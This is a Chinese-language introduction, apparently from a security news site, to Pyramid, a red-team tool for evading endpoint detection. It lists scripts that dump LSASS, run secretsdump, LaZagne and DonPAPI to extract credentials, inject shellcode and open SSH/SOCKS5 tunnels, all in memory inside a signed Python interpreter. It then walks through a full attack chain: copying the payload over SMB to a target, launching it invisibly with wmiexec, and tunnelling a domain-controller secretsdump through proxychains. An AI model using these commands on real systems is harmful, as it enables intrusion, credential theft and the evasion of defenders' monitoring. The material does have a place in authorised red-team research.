![](https://image.3001.net/images/20221218/1671365965_639f054d4de7c1364b1e9.png!small)

## 关于Pyramid

Pyramid是一款由多个Python脚本和模块依赖组成的EDR绕过工具，该工具专为红队研究人员设计，可以帮助广大研究人员通过利用Python的一些规避属性并尝试让EDR将其视为合法的Python应用程序，来实现红队渗透任务。

## 工具特性

> 1、使用了[
> _Python自带的工具包_](https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-> amd64.zip)来提供合法的[
> _声誉良好_](https://www.virustotal.com/gui/file/261f682238e2dc3296038c8bd78dd01e5874e1177ebe3da2afcba35ef82d73b7)的签名Python解释器；
>
>
> 2、Python有许多合法的应用程序，因此python.exe源码中也有很多不同的遥测技术（因为使用了本地API）。我们可以通过在Python.exe进程中执行操作，来尝试利用python.exe的遥测指纹；
>
> 3、利用了Python代码执行的审计缺少这一现状，即缺少审核功能；
>
>
> 4、所有的操作可以在python内部本地完成，比如说，动态导入Python模块以运行渗透测试工具，并直接在Python.exe中执行Beacon对象文件；

## 工具脚本

当前版本的Pyramid提供了八个主要的功能脚本：

> base-bh.py：该脚本负责在内存中导入和执行python-BloodHound；
>
> base-secretsdump.py：该脚本负责在内存中导入和执行[
> _Impacket_](https://github.com/SecureAuthCorp/impacket)的secretsdump模块；
>
> base-BOF-lsass.py：该脚本使用了精简版的nanodump从python.exe转储lsass；
>
> base-tunnel-> inj.py：该脚本负责在一个新的线程中导入和执行paramiko来创建一个SSH本地端口转发（至一个远程SSH服务器），之后便能够在本地向python.exe中注入Shellcode；
>
> base-DonPAPI.py：该脚本负责在内存中导入和执行[ _DonPAPI_](https://github.com/login-> securite/DonPAPI)，执行结果和提取出的凭证将会存储在Python内置包目录中；
>
> base-LaZagne.py：该脚本负责在内存中导入和执行[
> _LaZagne_](https://github.com/AlessandroZ/LaZagne)；
>
> base-tunnel-> socks5：该脚本负责在一个新的线程中导入和执行paramiko来创建一个SSH本地端口转发（至一个远程SSH服务器），接下来会在目标设备上执行一台本地Socks5代理服务器，该服务器可以通过SSH信道远程访问；
>
> base-clr：该脚本负责导入Pythonnet 并在内存中加载和执行一个.NET程序集；

## 工具下载

由于该工具基于Python 3开发，因此广大研究人员首先需要在本地设备上安装并配置好Python 3环境。接下来，使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/naksyn/Pyramid.git

## 工具使用

首先，我们需要针对HTTP服务器生成SSL证书：

    
    
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

接下来，使用SSL证书运行Pyramid HTTP服务器并提供基础认证功能：

    
    
    python3 PyramidHTTP.py 443 testuser Sup3rP4ss! /home/user/SSL/key.pem /home/user/SSL/cert.pem /home/user/Pyramid/Server/

Pyramid服务器运行之后，我们就可以使用工具提供的功能脚本来执行任务了。

## 工具使用演示

在下面的例子中，我们将使用pythonw.exe（无窗口的Python可执行程序）来在远程设备上执行base-tunnel-socks5.py，而且不会打开python.exe终端窗口：

![](https://image.3001.net/images/20221218/1671366045_639f059ddb6e05af271ba.png!small)

开启Pyramid服务器：

    
    
    python3 PyramidHTTP.py 443 testuser Sup3rP4ss! /home/nak/projects/dev/Proxy/Pyramid/key.pem /home/nak/projects/dev/Proxy/Pyramid/cert.pem /home/nak/projects/dev/Proxy/Pyramid/Server/

将下载下来的信息存储到cradle.py中，然后把解压的内置包和cradle.py拷贝到目标设备：

    
    
    smbclient //192.168.1.11/C$ -U domain/user -c 'prompt OFF; recurse ON; lcd /home/user/Downloads/python-3.10.4-embed-amd64; cd Users\Public; mkdir python-3.10.4-embed-amd64; cd python-3.10.4-embed-amd64; mput *'

执行pythonw.exe并启动cradle：

    
    
    /usr/share/doc/python3-impacket/examples/wmiexec.py domain/user:"Password1\!"@192.168.1.11 'C:\Users\Public\python-3.10.4-embed-amd64\pythonw.exe C:\Users\Public\python-3.10.4-embed-amd64\cradle.py'

在目标设备运行Socks5服务器并开启SSH信道，然后修改proxychains.conf并将流量通过信道发送至目标：

    
    
    proxychains impacket-secretsdump domain/user:"Password1\!"@192.168.1.50 -just-dc

## 许可证协议

本项目的开发与发布遵循Apache-2.0开源许可证协议。

## 项目地址

 **Pyramid** ：【[ _GitHub传送门_](https://github.com/naksyn/Pyramid)】

## 参考资料

> [ _https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-> amd64.zip_](https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-> amd64.zip)
>
> [
> _https://www.virustotal.com/gui/file/261f682238e2dc3296038c8bd78dd01e5874e1177ebe3da2afcba35ef82d73b7_](https://www.virustotal.com/gui/file/261f682238e2dc3296038c8bd78dd01e5874e1177ebe3da2afcba35ef82d73b7)
>
> [ _https://peps.python.org/pep-0578/_](https://peps.python.org/pep-0578/)
>
> [
> _https://github.com/naksyn/talks/blob/main/DEFCON30/Diego%20Capriotti%20-%20DEFCON30%20Adversary%20Village%20-%20%20Python%20vs%20Modern%20Defenses.pdf_](https://github.com/naksyn/talks/blob/main/DEFCON30/Diego%20Capriotti%20-%20DEFCON30%20Adversary%20Village%20-%20%20Python%20vs%20Modern%20Defenses.pdf)
>
> [ _https://www.naksyn.com/edr%20evasion/2022/09/01/operating-into-EDRs-> blindspot.html_](https://www.naksyn.com/edr%20evasion/2022/09/01/operating-> into-EDRs-blindspot.html)
>
> [ _https://twitter.com/snovvcrash_](https://twitter.com/snovvcrash)
>
> [
> _https://github.com/SecureAuthCorp/impacket﻿_](https://github.com/SecureAuthCorp/impacket)

